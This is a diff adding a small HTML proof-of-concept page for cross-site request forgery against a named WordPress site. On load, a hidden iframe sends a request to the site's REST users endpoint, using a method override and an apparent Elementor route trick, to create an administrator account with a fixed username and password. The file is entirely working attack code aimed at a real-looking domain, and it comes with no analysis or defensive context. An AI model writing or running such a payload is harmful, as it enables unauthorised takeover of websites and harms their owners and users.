@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="utf-8"><title>PoC</title></head>
+<body>
+  <iframe name="csrf" style="width:0;height:0;border:0;position:absolute"></iframe>
+  <script>
+    var url = "https://mrgm.co.ke/wp-json/wp/v2/users" +
+      "?_method=POST&username=test&email=test%40example.test" +
+      "&password=Mike%4017894&roles%5B%5D=administrator&x=elementor/v1/events/";
+    document.getElementsByName('csrf')[0].src = url;
+  </script>
+</body>
+</html>
